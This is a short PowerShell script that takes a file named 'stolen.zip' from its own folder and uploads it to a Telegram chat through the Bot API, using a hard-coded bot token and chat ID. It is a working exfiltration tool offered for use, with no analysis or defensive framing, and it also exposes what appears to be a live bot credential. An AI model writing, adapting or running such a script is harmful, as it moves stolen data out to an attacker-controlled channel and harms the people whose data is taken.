$token = "8520698411:AAFj5rY_el9MHA-D6w5NSZnZRxx-NzFxhLs"
$chat = "5275986375"
# Use the script's directory to build an absolute path
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$file = Join-Path $scriptDir "stolen.zip"

Write-Host "Script directory: $scriptDir"
Write-Host "Looking for file: $file"

if (Test-Path $file) {
    $size = (Get-Item $file).Length
    Write-Host "File exists. Size: $size bytes"
    curl.exe -F chat_id=$chat -F document=@$file "https://api.telegram.org/bot$token/sendDocument"
} else {
    Write-Host "ERROR: File not found!"
    exit 1
}